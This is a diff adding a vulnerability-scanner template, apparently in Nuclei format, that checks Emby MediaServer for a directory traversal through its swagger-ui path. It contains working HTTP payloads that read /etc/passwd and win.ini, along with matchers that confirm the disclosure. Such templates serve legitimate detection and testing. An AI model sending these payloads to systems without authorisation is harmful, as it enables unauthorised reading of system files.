@@ -1,0 +1,38 @@
+id: emby-mediaserver-directory-traversal
+info:
+  name: Emby MediaServer Directory Traversal File Disclosure
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    The vulnerability allows directory traversal, leading to arbitrary file disclosure. Affected versions include Emby MediaServer 3.1.0 on Linux, Windows, and Mac, and version 3.2.5 on Windows. Exploits improper verification of the 'swagger-ui' object.
+  reference:
+    - https://www.seebug.org/vuldb/ssvid-96966
+  tags: file-inclusion
+http:
+  - raw:
+      - |
+        GET /emby/swagger-ui/../../../../../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+  - raw:
+      - |
+        GET /emby/swagger-ui/../../../../../../../../../../../../windows/win.ini HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "[fonts]"
+          - "[extensions]"
